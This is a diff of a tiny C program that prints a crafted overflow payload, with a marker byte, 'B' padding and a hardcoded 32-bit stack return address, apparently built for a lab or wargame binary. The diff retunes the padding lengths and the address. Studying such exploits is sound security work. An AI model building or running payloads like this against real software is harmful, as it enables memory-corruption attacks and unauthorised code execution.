@@ -1,11 +1,11 @@
-# include <stdio.h>
+#include <stdio.h>
 #include <unistd.h>
 
 int main()
 {
 		printf("\x80" \
-			"BBBBBBBBBBBB" \
-			"\x76\xd5\xff\xff" \
-			"BBBB" \
-			"\n");
+				"BBBBBBBB" \
+				"\x36\xf6\xff\xbf" \
+				"BBBBBBBBBBBBBBBBBBBBBBBBBB" \
+				"\n");
 }
